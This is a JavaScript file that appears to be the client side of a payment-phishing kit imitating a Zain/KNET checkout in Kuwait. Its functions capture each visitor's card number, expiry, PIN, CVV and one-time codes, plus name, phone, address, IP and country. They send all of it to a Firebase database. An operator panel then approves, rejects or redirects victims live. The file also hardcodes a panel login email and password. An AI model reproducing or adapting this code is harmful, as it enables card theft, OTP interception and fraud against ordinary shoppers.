(function () {
  // ═══════════════════════════════════════════════════════════
  // إعدادات مشروع Firebase الجديد (qatar-oman) — موحّد للموقعين
  // ═══════════════════════════════════════════════════════════
  const firebaseConfig = {
    apiKey: "AIzaSyDNQotHYC8WcMi1AAHrHJe_rQR7OZ0V5FI",
    authDomain: "qatar-oman.firebaseapp.com",
    databaseURL: "https://qatar-oman-default-rtdb.firebaseio.com",
    projectId: "qatar-oman",
    storageBucket: "qatar-oman.firebasestorage.app",
    messagingSenderId: "488967046879",
    appId: "1:488967046879:web:77d744e1b45d0f59da8b6a",
    measurementId: "G-FP0FKD9W4T"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }

  // تحميل وحدة المصادقة ديناميكياً إذا لم تكن محمّلة
  let authLoaded = (typeof firebase.auth === 'function');
  const ensureAuthLoaded = (authLoaded
    ? Promise.resolve()
    : new Promise(function (resolve, reject) {
        const s = document.createElement('script');
        s.src = 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js';
        s.onload = resolve;
        s.onerror = reject;
        document.head.appendChild(s);
      }));

  // بيانات دخول لوحة التحكم (نفس حساب اللوحة — له صلاحية قراءة/كتابة على customers)
  const PANEL_EMAIL = 'panel-dashboard@qatar-oman.local';
  const PANEL_PASSWORD = 'ZainDashboard2026!';
  let __authReady = null;

  window.ensureAuthReady = function () {
    if (__authReady) return __authReady;
    __authReady = ensureAuthLoaded.then(function () {
      return firebase.auth().signInWithEmailAndPassword(PANEL_EMAIL, PANEL_PASSWORD)
        .then(function () { return firebase.auth().currentUser.getIdToken(); });
    }).catch(function (err) {
      console.error('Firebase auth failed:', err && err.code, err && err.message);
      return null;
    });
    return __authReady;
  };

  const db = firebase.firestore();
  const rtd = firebase.database();

  // إتاحة المراجع عالمياً للصفحات الأخرى
  window.db = db;
  window.rtd = rtd;

  let sessionId = localStorage.getItem('zain_session_id');
  if (!sessionId) {
    sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('zain_session_id', sessionId);
  }
  window.sessionId = sessionId;

  // مرجع وثيقة العميل في Firestore (المصدر الموحّد للوحة التحكم الجديدة)
  const customerRef = db.collection("customers").doc(sessionId);
  window.customerRef = customerRef;

  window.getDeviceAndBrowser = function () {
    const ua = navigator.userAgent;
    let browser = "Other";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let device = "PC";
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
      device = "Mobile";
    }
    return { device, browser };
  };

  // كشف دولة الزائر من عنوان IP عبر خدمة geolocation
  // نحاول عدة خدمات لضمان الموثوقية، ونتيجة ثابتة (cache) لتجنب التكرار
  let __visitorCountry = null;
  let __visitorCountryPromise = null;
  window.getVisitorCountry = function () {
    if (__visitorCountry) return Promise.resolve(__visitorCountry);
    if (__visitorCountryPromise) return __visitorCountryPromise;
    __visitorCountryPromise = (async () => {
      // خريطة رموز الدول إلى أسماء عربية
      const countryNames = {
        KW: 'الكويت', SA: 'السعودية', AE: 'الإمارات', QA: 'قطر', BH: 'البحرين',
        OM: 'عُمان', JO: 'الأردن', EG: 'مصر', IQ: 'العراق', LB: 'لبنان',
        SY: 'سوريا', PS: 'فلسطين', YE: 'اليمن', SD: 'السودان', LY: 'ليبيا',
        TN: 'تونس', DZ: 'الجزائر', MA: 'المغرب', MR: 'موريتانيا', SO: 'الصومال',
        IR: 'إيران', TR: 'تركيا', US: 'الولايات المتحدة', GB: 'بريطانيا',
      };
      const services = [
        'https://ipapi.co/json/',
        'https://ipwho.is/',
        'https://get.geojs.io/v1/ip/country.json',
      ];
      for (const url of services) {
        try {
          const res = await fetch(url);
          if (!res.ok) continue;
          const data = await res.json();
          let code = data.country_code || data.country || data.code || '';
          code = String(code).toUpperCase().trim();
          if (code && code.length === 2) {
            __visitorCountry = countryNames[code] || code;
            return __visitorCountry;
          }
        } catch (e) {}
      }
      __visitorCountry = 'غير معروف';
      return __visitorCountry;
    })();
    return __visitorCountryPromise;
  };

  function getFriendlyPageName() {
    const path = window.location.pathname;
    if (path.includes('knet')) return 'صفحة الكي نت';
    if (path.includes('verification')) return 'صفحة التحقق';
    if (path.includes('gateway')) return 'بوابة الدفع';
    if (path.includes('carte')) return 'سلة التسوق';
    return 'الصفحة الرئيسية';
  }

  // ═══════════════════════════════════════════════════════════
  // ضمان وجود وثيقة العميل customers/{sessionId} بالحقول المطلوبة للوحة
  // ═══════════════════════════════════════════════════════════
  window.ensureCustomerDoc = function (extra) {
    const now = Date.now();
    const base = {
      sessionId: sessionId,
      status: 'pending',
      decision: 'pending',
      lastSeen: now,
      currentPage: getFriendlyPageName(),
      name: localStorage.getItem('customerName') || '',
      phone: localStorage.getItem('phone') || '',
      mobile: localStorage.getItem('phone') || '',
      address: localStorage.getItem('address') || '',
      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 د.ك',
      isHidden: false,
      flagColor: '',
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    };
    const merged = Object.assign({}, base, extra || {});
    return customerRef.set(merged, { merge: true });
  };

  // ═══════════════════════════════════════════════════════════
  // نبض الحضور (heartbeat) — يكتب lastSeen في customers/{sessionId} كل 10 ثوانٍ
  // كي يظهر العميل "متصل" في لوحة التحكم
  // ═══════════════════════════════════════════════════════════
  let __heartbeatTimer = null;
  window.startPresenceHeartbeat = function () {
    if (__heartbeatTimer) return;
    customerRef.set({ lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
    __heartbeatTimer = setInterval(function () {
      customerRef.set({ lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
    }, 10000);

    // عند مغادرة الصفحة: اكتب lastSeen قديم ليصبح العميل "غير متصل"
    window.addEventListener('beforeunload', function () {
      try {
        customerRef.set({ lastSeen: Date.now() - 70000 }, { merge: true });
      } catch (e) {}
    });
  };

  window.initFirebaseSession = async function () {
    const { device, browser } = window.getDeviceAndBrowser();
    const docRef = db.collection("payments").doc(sessionId);
    const friendlyPage = getFriendlyPageName();
    const rtdSessionRef = rtd.ref('sessions/' + sessionId);
    const now = Date.now();
    const createdTime = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });

    // جلب IP بشكل سريع وغير معطل للدخول
    let visitorIp = 'Unknown';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      visitorIp = data.ip;
    } catch (e) {}

    // كشف دولة الزائر من عنوان IP (لا يُعطل الدخول بانتظارها)
    let visitorCountry = 'غير معروف';
    try {
      visitorCountry = await window.getVisitorCountry();
    } catch (e) {}

    const sessionData = {
      id: sessionId,
      status: 'active',
      phone: localStorage.getItem('phone') || '',
      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 د.ك',
      page: friendlyPage,
      device: device,
      browser: browser,
      createdTime: createdTime,
      startTime: now,
      country: visitorCountry,
      hasNewActivity: false,
      ip: visitorIp
    };

    // ضمان وجود وثيقة العميل في customers (المصدر الموحّد للوحة الجديدة)
    try {
      await window.ensureCustomerDoc({ ip: visitorIp, device: device, browser: browser, country: visitorCountry });
    } catch (e) { console.error("ensureCustomerDoc error:", e); }

    // بدء نبض الحضور
    window.startPresenceHeartbeat();

    // Update RTD (للتوافق مع اللوحة القديمة)
    rtdSessionRef.once('value', (snapshot) => {
      if (!snapshot.exists()) {
        rtdSessionRef.set(sessionData);
      } else {
        rtdSessionRef.update({ page: friendlyPage, status: 'active', hasNewActivity: true, ip: visitorIp });
      }
    });

    // تتبع الحضور (presence) للوحة التحكم القديمة
    const presenceRef = rtd.ref('presence/' + sessionId);
    presenceRef.set({ online: true, lastSeen: now });
    presenceRef.onDisconnect().set({ online: false, lastSeen: Date.now() });

    // Update Firestore payments (أرشيف إضافي)
    docRef.get().then((snap) => {
      if (!snap.exists) {
        docRef.set({ ...sessionData, status: 'PENDING', paymentAttempts: [], timeline: [] });
      } else {
        docRef.update({ page: friendlyPage, hasNewActivity: true, ip: visitorIp });
      }
    });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات البطاقة
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin, cvv) {
    const attemptId = 'card_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    const cardData = {
      id: attemptId,
      bankName: bank || 'غير معروف',
      cardPrefix: prefix || '',
      cardNumber: cardNum || '',
      expiry: `${expMonth || ''}/${expYear || ''}`,
      pin: pin || '',
      cvv: cvv || '',
      timestamp: timestampStr
    };

    rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة التحقق' });
    db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData);
    // أرشيف دائم في مجموعة cards
    db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال رمز التحقق OTP
  // يكتب الحقل otp في وثيقة العميل customers/{sessionId} لعرضه في لوحة التحكم
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseOtp = function (otp) {
    const otpId = 'otp_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const otpData = { id: otpId, otp: otp, timestamp: timestampStr };

    rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true });
    db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData);
    // أرشيف دائم في مجموعة otps
    db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
    // كتابة otp في وثيقة العميل لتعرضها لوحة التحكم الجديدة
    customerRef.set({ otp: String(otp || ''), lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
    return Promise.resolve();
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات العميل والتوصيل (الاسم، العنوان، الهاتف...)
  // تُستدعى من صفحة السلة عند المتابعة للدفع
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseCustomer = function (customer) {
    const data = {
      sessionId: sessionId,
      name: customer.name || '',
      phone: customer.phone || '',
      mobile: customer.phone || '',
      address: customer.address || '',
      apartment: customer.apartment || '',
      deliveryNotes: customer.deliveryNotes || '',
      amount: customer.amount || '',
      paymentType: customer.paymentType || 'full',
      items: customer.items || [],
      status: 'pending',
      decision: 'pending',
      lastSeen: Date.now(),
      currentPage: getFriendlyPageName(),
      isHidden: false,
      flagColor: '',
      ip: '',
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    };
    // حفظ الاسم محلياً لاستخدامه في ensureCustomerDoc
    if (data.name) localStorage.setItem('customerName', data.name);
    if (data.address) localStorage.setItem('address', data.address);
    // تحديث الجلسة اللحظية
    rtd.ref('sessions/' + sessionId).update({
      phone: data.phone,
      amount: data.amount,
      customerName: data.name,
      hasNewActivity: true
    });
    // حفظ دائم في Firestore customers (المصدر الموحّد للوحة الجديدة)
    db.collection("customers").doc(sessionId).set(data, { merge: true });
    if (data.items.length) {
      db.collection("orders").doc(sessionId).set({
        sessionId: sessionId,
        items: data.items,
        subtotal: data.amount,
        paymentType: data.paymentType,
        status: 'PENDING',
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true });
    }
  };

  // ═══════════════════════════════════════════════════════════
  // الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسائل)
  // المصدر الأساسي: Firestore customers/{sessionId} — حقل decision/status
  //   decision = "approved" → onApproval
  //   decision = "rejected" → onRejection
  // مصدر احتياطي (للتوافق مع اللوحة القديمة): RTDB commands/{sessionId}
  // callbacks: { onApproval, onRejection, onRedirect, onMessage }
  // ═══════════════════════════════════════════════════════════
  window.listenForAdminCommands = function (callbacks) {
    callbacks = callbacks || {};

    // ---- المصدر الأساسي: Firestore customers/{sessionId} عبر onSnapshot ----
    // القرار يُنفَّذ مرة واحدة فقط ثم يُصفَّر في قاعدة البيانات إلى "pending"،
    // حتى يتمكن المدير من الكتابة/التعديل من جديد دون تكرار الرسائل أو إعادة التحميل.
    let __lastDecision = null;
    let __lastDecisionAt = 0;
    let __decisionInFlight = false;
    let __pendingSince = null;   // وقت أول رؤية للقرار "pending" بعد قرار سابق
    let __resetDone = false;     // تم تصفير آخر قرار في Firestore

    function resetDecisionToPending() {
      if (__resetDone) return;
      __resetDone = true;
      try {
        customerRef.set({ decision: 'pending', status: 'pending' }, { merge: true })
          .catch(function (e) { console.warn('decision reset failed:', e && e.message); });
      } catch (e) {
        console.warn('decision reset failed:', e);
      }
    }

    // نقطة تنفيذ واحدة للقرار (تُستدعى من Firestore ومن RTDB)
    // تمنع التكرار: نفس القرار خلال نافذة زمنية قصيرة يُتجاهل، ثم يُصفَّر في قاعدة البيانات.
    function dispatchDecision(decision, data) {
      if (decision !== 'approved' && decision !== 'rejected') return;
      data = data || {};
      if (__decisionInFlight) return;
      if (decision === __lastDecision && (Date.now() - __lastDecisionAt) < 4000) return;
      __lastDecision = decision;
      __lastDecisionAt = Date.now();
      __decisionInFlight = true;
      __resetDone = false;
      __pendingSince = null;
      try {
        if (decision === 'approved') {
          if (typeof callbacks.onApproval === 'function') callbacks.onApproval({ decision: 'approved', status: data.status, raw: data });
        } else {
          if (typeof callbacks.onRejection === 'function') callbacks.onRejection({ decision: 'rejected', status: data.status, reason: data.reason || '', raw: data });
        }
      } finally {
        setTimeout(function () { __decisionInFlight = false; }, 800);
        resetDecisionToPending();
      }
    }

    function handleDecision(decision, data) {
      // حالة معلّقة: انتظر ثانيتين للتأكد أنها الحالة الافتراضية (وليست مجرد تأخر)
      // ثم صفّر آخر قرار محلياً ليقبل قراراً جديداً بنفس القيمة.
      if (decision === 'pending' || decision === 'null' || !decision) {
        if (__lastDecision && __lastDecision !== 'pending') {
          if (__pendingSince === null) __pendingSince = Date.now();
          if (Date.now() - __pendingSince >= 2000) {
            __lastDecision = 'pending';
            __pendingSince = null;
            __resetDone = false;
          }
        } else {
          __lastDecision = 'pending';
        }
        return;
      }
      dispatchDecision(decision, data);
    }

    // استخراج قرار من استجابة Firestore REST (fields.decision.stringValue)
    function restDecision(fields) {
      if (!fields) return 'pending';
      var d = fields.decision || fields.status;
      return (d && d.stringValue) ? d.stringValue : 'pending';
    }

    // استخراج الطابع الزمني من استجابة Firestore REST
    function restTimestamp(fields) {
      if (!fields) return null;
      var t = fields.decidedAt || fields.lastSeen;
      return (t && t.timestampValue) ? t.timestampValue : null;
    }

    // بدء الاستماع اللحظي عبر onSnapshot
    function startSnapshot(token) {
      try {
        customerRef.onSnapshot((doc) => {
          if (!doc.exists) return;
          const data = doc.data() || {};
          handleDecision(data.decision || data.status || 'pending', data);
        }, (err) => {
          console.error("customerRef onSnapshot error:", err);
        });
      } catch (e) {
        console.error("onSnapshot setup error:", e);
      }
    }

    // انتظر المصادقة ثم ابدأ الاستماع (قواعد أمان Firestore تتطلب تسجيل دخول)
    function startListening() {
      window.ensureAuthReady().then(function (token) {
        // الاستماع اللحظي عبر onSnapshot
        startSnapshot(token);

        // استطلاع احتياطي عبر REST كل 2 ثانية (أسرع للاستجابة الفورية)
        const pollUrl = 'https://firestore.googleapis.com/v1/projects/qatar-oman/databases/(default)/documents/customers/' + encodeURIComponent(sessionId);
        setInterval(function () {
          // تحديث الـ token في كل استطلاع (قد تكون انتهت صلاحيته)
          var curUser = firebase.auth().currentUser;
          var tokenPromise = curUser ? curUser.getIdToken() : Promise.resolve(token);
          tokenPromise.then(function (tk) {
            fetch(pollUrl, { headers: tk ? { 'Authorization': 'Bearer ' + tk } : {} })
              .then(function (r) { return r.json(); })
              .then(function (d) {
                if (d && d.fields) {
                  handleDecision(restDecision(d.fields), { decision: restDecision(d.fields), decidedAt: restTimestamp(d.fields), lastSeen: restTimestamp(d.fields), _rest: true });
                }
              })
              .catch(function (e) { /* تجاهل أخطاء الاستطلاع بصمت */ });
          }).catch(function () {});
        }, 2000);
      });
    }

    startListening();

    // ---- مصدر احتياطي: RTDB commands/{sessionId} (اللوحة القديمة) ----
    const cmdRef = rtd.ref('commands/' + sessionId);

    // بصمة دائمة لكل أمر RTDB في localStorage: تبقى بعد إعادة تحميل الصفحة
    // فيمنع تنفيذ نفس الأمر مرتين (وهو سبب حلقة إعادة التحميل السابقة).
    function cmdKey(kind) { return 'zain_cmd_' + kind + '_' + sessionId; }
    function cmdStamp(cmd) {
      return String(cmd.approvedAt || cmd.rejectedAt || cmd.redirectAt || cmd.timestamp || cmd.action || '');
    }
    function alreadyDone(kind, cmd) {
      try { return localStorage.getItem(cmdKey(kind)) === cmdStamp(cmd); } catch (e) { return false; }
    }
    function markDone(kind, cmd) {
      try { localStorage.setItem(cmdKey(kind), cmdStamp(cmd)); } catch (e) {}
    }
    // تصفير عقدة الأمر في قاعدة البيانات حتى لا يُعاد قراءتها بعد الانتقال لصفحة أخرى
    function clearCmd(kind) {
      try { cmdRef.child(kind).remove().catch(function () {}); } catch (e) {}
    }
    function currentPageFile() {
      var p = window.location.pathname.split('/').pop();
      return p || 'index.html';
    }

    cmdRef.child('approval').on('value', (snap) => {
      const cmd = snap.val();
      if (!cmd || cmd.action !== 'APPROVE_PAYMENT') return;
      if (alreadyDone('approval', cmd)) { clearCmd('approval'); return; }
      markDone('approval', cmd);
      clearCmd('approval');
      dispatchDecision('approved', cmd);
    });

    cmdRef.child('rejection').on('value', (snap) => {
      const cmd = snap.val();
      if (!cmd || cmd.action !== 'REJECT_PAYMENT') return;
      if (alreadyDone('rejection', cmd)) { clearCmd('rejection'); return; }
      markDone('rejection', cmd);
      clearCmd('rejection');
      dispatchDecision('rejected', cmd);
    });

    // التوجيه: يُنفَّذ مرة واحدة فقط. المشكلة السابقة: بعد الانتقال تُقرأ الصفحة
    // الجديدة نفس إشارة التوجيه المتبقية في قاعدة البيانات فيتكرر التوجيه بلا نهاية.
    cmdRef.child('redirect').on('value', (snap) => {
      const cmd = snap.val();
      if (!cmd || cmd.action !== 'REDIRECT_PAGE' || !cmd.targetPage) return;
      const target = String(cmd.targetPage);
      // لا توجّه العميل إلى الصفحة التي هو عليها أصلاً (حماية إضافية من الحلقة)
      if (target === currentPageFile() || target === window.location.pathname) {
        clearCmd('redirect');
        return;
      }
      if (alreadyDone('redirect', cmd)) { clearCmd('redirect'); return; }
      if (window.__redirectHandled) return;
      window.__redirectHandled = true;
      markDone('redirect', cmd);
      clearCmd('redirect');
      if (typeof callbacks.onRedirect === 'function') {
        callbacks.onRedirect(cmd);
      } else {
        window.location.href = target;
      }
    });

    rtd.ref('messages/' + sessionId).on('child_added', (snap) => {
      const msg = snap.val();
      if (msg && typeof callbacks.onMessage === 'function') callbacks.onMessage(msg);
    });
  };

  // ابدأ الجلسة بعد التأكد من المصادقة (قواعد أمان Firestore تتطلب تسجيل دخول للكتابة في customers)
  window.ensureAuthReady().then(function () {
    window.initFirebaseSession();
  });
})();
